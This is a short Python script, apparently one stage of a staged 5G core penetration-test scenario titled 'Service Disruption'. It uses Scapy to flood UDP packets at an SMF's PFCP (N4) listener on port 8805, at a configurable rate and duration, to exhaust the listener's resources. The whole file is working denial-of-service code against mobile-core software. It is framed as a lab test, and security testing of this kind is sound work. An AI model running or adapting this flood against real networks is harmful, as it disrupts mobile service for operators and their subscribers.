#!/usr/bin/env python3
"""
Stage 15b — Endpoint DoS via N4 (PFCP) volume
Scenario 3: Service Disruption

Note: sends UDP volume at SMF's PFCP listener. Not fully protocol-valid
PFCP (no Scapy layer available) - tests listener-level resource
exhaustion rather than valid-message-processing exhaustion.
"""

from scapy.all import IP, UDP, send
import time
import sys

SMF_ADDRESS = "192.168.134.128"
SMF_PFCP_PORT = 8805

def flood(duration_seconds, rate_per_second):
    print(f"[*] Stage 15b - N4/PFCP volume against {SMF_ADDRESS}:{SMF_PFCP_PORT}")
    pkt = IP(dst=SMF_ADDRESS) / UDP(dport=SMF_PFCP_PORT) / (b"\x20\x01" + b"\x00" * 20)
    end_time = time.time() + duration_seconds
    sent = 0
    while time.time() < end_time:
        send(pkt, count=rate_per_second // 10, inter=0.0001, verbose=False)
        sent += rate_per_second // 10
        time.sleep(0.1)
    print(f"[*] Total packets sent: {sent}")

if __name__ == "__main__":
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    flood(duration, rate)
